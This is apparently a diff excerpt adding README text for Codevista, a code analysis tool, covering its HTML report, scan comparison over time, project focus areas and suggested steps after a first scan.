+The report uses HTML, so your web browser opens it.
+
+### Can I compare scans later?
+Yes. The DNA fingerprinting and decay data help you compare results over time.
+
+## 📌 Project focus
+
+Codevista is built for:
+- code analysis
+- code quality checks
+- linter-style review
+- open-source projects
+- security checks
+- static analysis
+
+## 🧩 What to do next
+
+After your first scan:
+- open the report
+- look at the top warnings first
+- fix the most serious items
+- scan again after changes
+- keep the report for later review
